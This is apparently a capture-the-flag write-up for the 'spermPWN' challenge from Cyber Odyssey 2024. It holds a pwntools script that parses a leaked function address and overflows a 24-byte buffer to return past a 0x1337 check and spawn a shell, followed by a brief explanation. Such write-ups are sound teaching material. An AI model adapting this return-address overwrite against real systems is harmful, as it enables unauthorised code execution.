# Cyber Odyssey 2024 - spermPWN


Description : here you go, some free points.

<!--more-->

```python
from pwn import *

# Setup pwntools context for 64-bit architecture
context(arch='amd64', os='linux')

# Start the process
#p = process('./chall')

#remote nc pwn.akasec.club 2001
p = remote('pwn.akasec.club', 2001)

# Load the ELF binary to extract symbols and addresses
e = ELF('./chall')

# Receive the line containing the address of returnToMePlease
func = p.recvline()

# The output is something like: b'return to me please : 5555555551c9\n'
# We need to extract the address part (ascii string) from the line
func = func[24:len(func)-1]  # Extract '5555555551c9' from the output

# Convert the ASCII address string to an integer
func_addr = int(func, 16)

# Add 45 to the extracted address
new_func_addr = func_addr + 45

# Convert the new address to little-endian format using p64
new_func_addr_packed = p64(new_func_addr)

# Create the payload
padding = b"A" * 24  # Overflow buffer + overwrite return address
payload = padding + new_func_addr_packed

# Attach GDB to the running process and set a breakpoint at main+99


# Send the payload
p.sendline(payload)

# Drop into interactive mode to see the output
p.interactive()

```

## Explanation

at new_func_addr+0, you'll never spawn a shell because we fill a register with 0 then we compare it with 0x1337.

But that's like having your front door locked but your back door opened...So let's just go through the back door new_func_addr+45 (As in after the comparison).

